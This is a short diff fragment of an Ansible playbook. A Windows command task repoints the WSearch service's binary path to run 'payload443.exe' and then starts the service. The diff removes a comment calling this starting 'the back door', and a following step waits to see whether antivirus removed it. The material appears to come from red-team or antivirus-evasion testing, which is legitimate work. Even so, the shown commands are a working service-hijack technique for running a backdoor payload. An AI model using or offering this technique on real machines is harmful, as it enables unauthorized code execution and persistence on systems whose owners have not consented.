@@ -9,7 +9,6 @@
     win_command: |
       sc config WSearch binpath= "cmd /c c:\temp\payload443.exe"
       sc start WSearch
-  # start the service to execute the back door
       
   - name: sleep for 10 seconds and continue with play to check if AV removed or Not
     tags: always
